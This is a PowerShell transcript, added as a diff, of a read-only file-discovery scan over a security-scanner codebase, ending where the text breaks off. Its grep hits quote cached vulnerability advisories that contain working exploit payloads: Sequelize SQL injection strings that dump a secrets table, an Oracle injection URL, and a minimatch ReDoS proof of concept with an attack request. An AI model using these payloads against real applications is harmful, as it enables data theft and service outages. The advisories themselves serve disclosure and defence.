@@ -1,0 +1,1089 @@
+﻿**********************
+Windows PowerShell transcript start
+Start time: 20261002162306
+Username: LAPTOP-03RTE7HI\janan
+RunAs User: LAPTOP-03RTE7HI\janan
+Configuration Name: 
+Machine: LAPTOP-03RTE7HI (Microsoft Windows NT 10.0.26300.0)
+Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Process ID: 11004
+PSVersion: 5.1.26100.9549
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.26100.9549
+BuildVersion: 10.0.26100.9549
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+
+============================================================
+ R-SecOpsX V11 - CORRECTED TEST / CONFIGURATION DISCOVERY
+ READ-ONLY
+============================================================
+
+Files enumerated: 149
+
+--- Candidate test / validation / configuration files ---
+D:\data\Code test\r-SecOpsX_V11\analysis\benchmark_evidence_validation_v1.py
+D:\data\Code test\r-SecOpsX_V11\analysis\secret_live_validation_engine.py
+D:\data\Code test\r-SecOpsX_V11\config\analysis_context.yaml
+D:\data\Code test\r-SecOpsX_V11\core\benchmark_evidence_validation_v1.py
+D:\data\Code test\r-SecOpsX_V11\core\config.py
+D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate.ps1
+D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_CLEAN.ps1
+D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FINAL.ps1
+D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Baseline_Integrity_Gate_FIXED.ps1
+D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1
+D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1
+D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json
+D:\data\Code test\r-SecOpsX_V11\scanner\security_test_coverage.py
+D:\data\Code test\r-SecOpsX_V11\scanner\security_test_generator.py
+D:\data\Code test\r-SecOpsX_V11\Working folder\Baseline_Gate\V11_Baseline_Gate_20261002-161513.csv
+D:\data\Code test\r-SecOpsX_V11\Working folder\Baseline_Gate\V11_Baseline_Gate_20261002-161513.txt
+
+--- Exact / near-exact 12-test evidence ---
+[12/12] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:86 | '12/12',
+[12/12] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:159 | '12/12',
+[12 of 12] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:87 | '12 of 12',
+[12 passed] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:88 | '12 passed',
+[12 passed] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:160 | '12 passed',
+[12 PASS] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:88 | '12 passed',
+[12 PASS] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:89 | '12 PASS',
+[12 PASS] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:160 | '12 passed',
+[12 PASS] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:161 | '12 PASS',
+[12 tests] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:90 | '12 tests',
+[twelve tests] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:91 | 'twelve tests',
+[configuration tests] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:92 | 'configuration tests',
+[configuration tests] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:162 | 'configuration tests',
+[configuration validation] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:93 | 'configuration validation',
+[configuration validation] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:164 | 'configuration validation',
+[config tests] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:94 | 'config tests',
+[config tests] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:163 | 'config tests',
+[test_configuration] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:95 | 'test_configuration'
+[test_configuration] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:165 | 'test_configuration'
+
+--- Python test files ---
+
+--- Evidence contract references in test/config files ---
+[evidence_id] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:139 | 'evidence_id',
+[evidence_id] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:118 | 'evidence_id',
+[evidence_id] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:194 | $Text.Contains('evidence_id') -or
+[provenance] D:\data\Code test\r-SecOpsX_V11\main.py:1839 | "Review package provenance and regenerate the SBOM after dependency changes.",
+[provenance] D:\data\Code test\r-SecOpsX_V11\main.py:3112 | payload["metadata"]["runtime_artifact_provenance_gaps"] = rais.get(
+[provenance] D:\data\Code test\r-SecOpsX_V11\main.py:3113 | "provenance_gaps",
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\ai_model_risk_engine.py:116 | return "Immediately disable unsafe model loading, restrict tool execution, rotate exposed keys, and validate model provenance."
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:123 | "license_provenance": {
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\license_evidence_resolver.py:149 | "license_provenance": {
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:149 | Declared and resolved values are retained separately for provenance.
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:175 | # declaration and resolver provenance separately.
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\license_policy_engine.py:199 | # Explicit provenance marker for the decision layer.
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:27 | # SBOM / Provenance / Attestation Gaps
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:30 | ("PROVENANCE_FILE_MISSING", r"\bprovenance\s+(missing|not\s+found|unavailable)\b|\bmissing\s+provenance\b|\bslsa\s+(missing|not\s+found)\b", "HIGH", False),
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:143 | return "Artifact trust gap may materially weaken release assurance, provenance, or runtime integrity."
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:153 | return "Immediately validate artifact provenance, rotate exposed secrets if present, and block release until integrity is confirmed."
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:155 | return "Require signed artifacts, digest-pinned images, checksum validation, and provenance attestation before release."
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:157 | return "Add checksum, SBOM, provenance, and attestation controls to the artifact release process."
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:183 | provenance_gaps = 0
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:227 | if {"PROVENANCE_FILE_MISSING", "IN_TOTO_ATTESTATION_MISSING"} & names:
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:228 | provenance_gaps += 1
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\runtime_artifact_integrity_engine.py:292 | "provenance_gaps": provenance_gaps,
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:122 | return "Dependency trust indicator observed and should be reviewed for provenance and governance."
+[provenance] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:132 | return "Pin versions, remove mutable tags, and validate package provenance before release."
+[provenance] D:\data\Code test\r-SecOpsX_V11\core\rule_contract.py:48 | "provenance",
+[provenance] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:117 | def _provenance(finding: dict[str, Any]) -> dict[str, Any]:
+[provenance] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:118 | existing = finding.get("provenance")
+[provenance] D:\data\Code test\r-SecOpsX_V11\core\rule_contract_adapter.py:224 | "provenance": _provenance(f),
+[provenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:140 | 'provenance',
+[provenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:149 | 'EvidenceProvenance'
+[provenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:205 | $_.Name -match '(?i)model|schema|evidence|finding|graph|provenance|decision'
+[provenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:69 | $_.Name -match 'evidence|schema|graph|attack|provenance|confidence|finding|risk|decision|rcmsp'
+[provenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:119 | 'provenance',
+[provenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:124 | 'EvidenceProvenance',
+[provenance] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:195 | $Text.Contains('provenance') -or
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:818 | "Evidence","Review Status","Provenance",
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:855 | provenance=pkg.get("license_provenance") or {}
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:856 | provenance_text="; ".join(
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:857 | f"{k}={v}" for k,v in provenance.items()
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:870 | provenance_text,
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:1294 | _title_row(ws, "VULNERABILITY INTELLIGENCE PROVENANCE", 2); _hdr(ws, 2, ["Field", "Value"])
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3896 | "Review","Provenance"
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3908 | provenance=item.get("license_provenance") or {}
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3911 | provenance_text="; ".join(
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3914 | f"{k}={v}" for k,v in provenance.items()
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3950 | Paragraph(provenance_text,S["TDSm"]),
+[provenance] D:\data\Code test\r-SecOpsX_V11\reporting\report_mappings.py:213 | "KAFKA_UNSAFE_DESERIALIZATION": ["Do not deserialize broker payloads into arbitrary objects.", "Use schema registry with Avro/Protobuf/JSON schema validation.", "Authenticate producers and validate message provenance.", "Quarantine malformed or unexpected message types."],
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\aibom.py:78 | "recommendation": "Validate model provenance, license, unsafe model loading, and dependency trust."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\aibom.py:116 | "recommendation": "Validate local model provenance, exposed endpoints, and sensitive prompt handling."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:770 | "Verify model signatures, checksums, and provenance before loading.",
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:777 | "Verify model signatures, checksums, and provenance before loading.",
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:785 | "Block model promotion when checksum, signature, or provenance metadata is missing.",
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:854 | "Require provenance, checksum, and approval metadata for external models and plugins.",
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:30 | "recommendation": "Validate model provenance, unsafe model loading, dependency trust, and dataset governance."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:44 | "recommendation": "Avoid loading untrusted PyTorch models with torch.load; verify provenance and signatures."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:57 | "recommendation": "Validate training data lineage, model provenance, and serialized model loading."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:72 | "recommendation": "Validate model provenance, feature lineage, and training data governance."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:86 | "recommendation": "Validate model provenance, feature lineage, and training data governance."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:154 | "recommendation": "Validate ONNX model provenance, runtime version, and input validation controls."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:179 | "recommendation": "Validate R model provenance, dataset lineage, and serialized model handling."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\mlbom.py:213 | "recommendation": "Validate RDS model provenance and avoid loading untrusted serialized artifacts."
+[provenance] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:813 | "Pin dependency versions and verify package provenance/integrity; regenerate the SBOM after dependency changes.",
+[timestamp] D:\data\Code test\r-SecOpsX_V11\main.py:129 | _SCAN_TIMING["started_at"] = datetime.fromtimestamp(now).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+[timestamp] D:\data\Code test\r-SecOpsX_V11\analysis\security_control_coverage_engine.py:22 | ("REPLAY_PROTECTION_CONTROL", r"\breplay_protection\b|\btimestamp_validation\b|\bnonce_required\s*=\s*True\b", "ABUSE_PREVENTION", "OWASP_API6"),
+[timestamp] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:141 | 'timestamp',
+[timestamp] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:120 | 'timestamp',
+[timestamp] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:125 | 'EvidenceTimestamp',
+[timestamp] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:197 | $Text.Contains('timestamp')
+[timestamp] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:348 | "timestamp": datetime.now(timezone.utc).isoformat(),
+[timestamp] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:79 | "timestamp": datetime.now(timezone.utc).isoformat(),
+[timestamp] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:3116 | "details": "### Summary\n\nSQL injection via unescaped cast type in JSON/JSONB `where` clause processing. The `_traverseJSON()` function splits JSON path keys on `::` to extract a cast type, which is interpolated raw into `CAST(... AS <type>)` SQL. An attacker who controls JSON object keys can inject arbitrary SQL and exfiltrate data from any table.\n\nAffected: v6.x through 6.37.7. v7 (`@sequelize/core`) is not affected.\n\n### Details\n\nIn `src/dialects/abstract/query-generator.js`, `_traverseJSON()` extracts a cast type from `::` in JSON keys without validation:\n\n```javascript\n// line 1892\n_traverseJSON(items, baseKey, prop, item, path) {\n    let cast;\n    if (path[path.length - 1].includes(\"::\")) {\n      const tmp = path[path.length - 1].split(\"::\");\n      cast = tmp[1];       // attacker-controlled, no escaping\n      path[path.length - 1] = tmp[0];\n    }\n    // ...\n    items.push(this.whereItemQuery(this._castKey(pathKey, item, cast), { [Op.eq]: item }));\n}\n```\n\n`_castKey()` (line 1925) passes it to `Utils.Cast`, and `handleSequelizeMethod()` (line 1692) interpolates it directly:\n\n```javascript\nreturn `CAST(${result} AS ${smth.type.toUpperCase()})`;\n```\n\nJSON path **values** are escaped via `this.escape()` in `jsonPathExtractionQuery()`, but the cast **type** is not.\n\n**Suggested fix** \u2014 whitelist known SQL data types:\n\n```javascript\nconst ALLOWED_CAST_TYPES = new Set([\n  'integer', 'text', 'real', 'numeric', 'boolean', 'date',\n  'timestamp', 'timestamptz', 'json', 'jsonb', 'float',\n  'double precision', 'bigint', 'smallint', 'varchar', 'char',\n]);\n\nif (cast && !ALLOWED_CAST_TYPES.has(cast.toLowerCase())) {\n  throw new Error(`Invalid cast type: ${cast}`);\n}\n```\n\n### PoC\n\n`npm install sequelize@6.37.7 sqlite3`\n\n```javascript\nconst { Sequelize, DataTypes } = require('sequelize');\n\nasync function main() {\n  const sequelize = new Sequelize('sqlite::memory:', { logging: false });\n\n  const User = sequelize.define('User', {\n    username: DataTypes.STRING,\n    metadata: DataTypes.JSON,\n  });\n\n  const Secret = sequelize.define('Secret', {\n    key: DataTypes.STRING,\n    value: DataTypes.STRING,\n  });\n\n  await sequelize.sync({ force: true });\n\n  await User.bulkCreate([\n    { username: 'alice', metadata: { role: 'admin', level: 10 } },\n    { username: 'bob',   metadata: { role: 'user',  level: 5 } },\n    { username: 'charlie', metadata: { role: 'user', level: 1 } },\n  ]);\n\n  await Secret.bulkCreate([\n    { key: 'api_key', value: 'sk-secret-12345' },\n    { key: 'db_password', value: 'super_secret_password' },\n  ]);\n\n  // TEST 1: WHERE clause bypass\n  const r1 = await User.findAll({\n    where: { metadata: { 'role::text) or 1=1--': 'anything' } },\n    logging: (sql) => console.log('SQL:', sql),\n  });\n  console.log('OR 1=1:', r1.map(u => u.username));\n  // Returns ALL rows: ['alice', 'bob', 'charlie']\n\n  // TEST 2: UNION-based cross-table exfiltration\n  const r2 = await User.findAll({\n    where: {\n      metadata: {\n        'role::text) and 0 union select id,key,value,null,null from Secrets--': 'x'\n      }\n    },\n    raw: true,\n    logging: (sql) => console.log('SQL:', sql),\n  });\n  console.log('UNION:', r2.map(r => `${r.username}=${r.metadata}`));\n  // Returns: api_key=sk-secret-12345, db_password=super_secret_password\n}\n\nmain().catch(console.error);\n```\n\n**Output:**\n\n```\nSQL: SELECT `id`, `username`, `metadata`, `createdAt`, `updatedAt`\n  FROM `Users` AS `User`\n  WHERE CAST(json_extract(`User`.`metadata`,'$.role') AS TEXT) OR 1=1--) = 'anything';\nOR 1=1: [ 'alice', 'bob', 'charlie' ]\n\nSQL: SELECT `id`, `username`, `metadata`, `createdAt`, `updatedAt`\n  FROM `Users` AS `User`\n  WHERE CAST(json_extract(`User`.`metadata`,'$.role') AS TEXT) AND 0\n  UNION SELECT ID,KEY,VALUE,NULL,NULL FROM SECRETS--) = 'x';\nUNION: [ 'api_key=sk-secret-12345', 'db_password=super_secret_password' ]\n```\n\n### Impact\n\n**SQL Injection (CWE-89)** \u2014 Any application that passes user-controlled objects as `where` clause values for JSON/JSONB columns is vulnerable. An attacker can exfiltrate data from any table in the database via UNION-based or boolean-blind injection. All dialects with JSON support are affected (SQLite, PostgreSQL, MySQL, MariaDB).\n\nA common vulnerable pattern:\n\n```javascript\napp.post('/api/users/search', async (req, res) => {\n  const users = await User.findAll({\n    where: { metadata: req.body.filter }  // user controls JSON object keys\n  });\n  res.json(users);\n});\n```",
+[timestamp] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:3136 | "details": "### Summary\nSQL Injection is possible with strings only **if dialect is set to `oracle`**.\nThe vulnerability was confirmed on Sequelize v6.37.3.\n\n### Details\nThe `escape` function defined in `sql-string.js` does not escape quotes if the value starts with `TO_TIMESTAMP` or `TO_DATE`.\n\n```javascript\n  } else if (dialect === 'oracle' && typeof val === 'string') {\n    if (val.startsWith('TO_TIMESTAMP') || val.startsWith('TO_DATE')) {\n      return val;\n    }\n    val = val.replace(/'/g, \"''\");\n  }\n```\n\n### PoC\nSuppose the application has the following code:\n\n```javascript\n  var result = await models.Student.findOne({\n    where: {\n      firstName: req.query.firstName\n    }\n  });\n```\n\nAn attacker can inject arbitrary sql expressions.\n\n`http://host/path?firstName=TO_DATE('0','Y')||'' OR 1=1--`\n\nThe resulted SQL will be:\n\n```SQL\nSELECT ... WHERE \"Student\".\"firstName\" = TO_DATE('0','Y')||'' OR 1=1-- ORDER BY \"Student\".\"id\" OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;\n```\n\n### Impact\nData theft and tampering.",
+[timestamp] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:5896 | "details": "### Summary\n\nNested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\n---\n\n### Details\n\nThe root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\n```typescript\n: this.type === '*' && bodyDotAllowed ? `)?`\n: `)${this.type}`\n```\n\nThis produces the following regexps:\n\n| Pattern              | Generated regex                          |\n|----------------------|------------------------------------------|\n| `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n| `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n| `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n| `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\nThese are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\nThe generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\nMeasured times via `minimatch()`:\n\n| Pattern              | Input              | Time       |\n|----------------------|--------------------|------------|\n| `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n| `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n| `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n| `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\nDepth inflection at fixed input `a` x16 + `z`:\n\n| Depth | Pattern              | Time         |\n|-------|----------------------|--------------|\n| 1     | `*(a\\|b)`            | 0ms          |\n| 2     | `*(*(a\\|b))`         | 4ms          |\n| 3     | `*(*(*(a\\|b)))`      | 270ms        |\n| 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\nGoing from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- verify the generated regexps and timing (standalone script)**\n\nSave as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\n```javascript\nimport { minimatch, Minimatch } from 'minimatch'\n\nfunction timed(fn) {\n  const s = process.hrtime.bigint()\n  let result, error\n  try { result = fn() } catch(e) { error = e }\n  const ms = Number(process.hrtime.bigint() - s) / 1e6\n  return { ms, result, error }\n}\n\n// Verify generated regexps\nfor (let depth = 1; depth <= 4; depth++) {\n  let pat = 'a|b'\n  for (let i = 0; i < depth; i++) pat = `*(${pat})`\n  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n  console.log(`depth=${depth} \"${pat}\" -> ${re}`)\n}\n// depth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\n// depth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\n// depth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\n// depth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\n// Safe-length timing (exponential growth confirmation without multi-minute hang)\nconst cases = [\n  ['*(*(*(a|b)))', 15],   // ~270ms\n  ['*(*(*(a|b)))', 17],   // ~800ms\n  ['*(*(*(a|b)))', 19],   // ~2400ms\n  ['*(*(a|b))',    23],   // ~260ms\n  ['*(a|b)',      101],   // <5ms (depth=1 control)\n]\nfor (const [pat, n] of cases) {\n  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))\n  console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n}\n\n// Confirm noext disables the vulnerability\nconst t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\nconsole.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\n// +() is equally affected\nconst t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\nconsole.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n```\n\nObserved output:\n```\ndepth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\ndepth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\ndepth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\ndepth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\"*(*(*(a|b)))\" n=15: 269ms result=false\n\"*(*(*(a|b)))\" n=17: 268ms result=false\n\"*(*(*(a|b)))\" n=19: 2408ms result=false\n\"*(*(a|b))\"    n=23: 257ms result=false\n\"*(a|b)\"       n=101: 0ms result=false\nnoext=true: 0ms (should be ~0ms)\n\"+(+(+(a|b)))\" n=18: 6300ms result=false\n```\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nSave as `poc4-server.mjs`:\n\n```javascript\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3001\nhttp.createServer((req, res) => {\n  const url     = new URL(req.url, `http://localhost:${PORT}`)\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n}).listen(PORT, () => console.log(`listening on ${PORT}`))\n```\n\nTerminal 1 -- start the server:\n```\nnode poc4-server.mjs\n```\n\nTerminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n```\ncurl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz\" &\n```\n\nTerminal 3 -- send a benign request while the attack is in-flight:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz\"\n```\n\n**Observed output -- Terminal 2 (attack):**\n```\n{\"result\":false,\"ms\":\"64149\"}\n```\n\n**Observed output -- Terminal 3 (benign, concurrent):**\n```\n{\"result\":false,\"ms\":\"0\"}\n\ntime_total: 63.022047s\n```\n\n**Terminal 1 (server log):**\n```\n[2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n[2026-02-20T09:42:21.775Z] done in 64149ms result=false\n[2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n[2026-02-20T09:42:21.779Z] done in 0ms result=false\n```\n\nThe server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\nNote: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\n---\n\n### Impact\n\nAny context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\nDepth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input 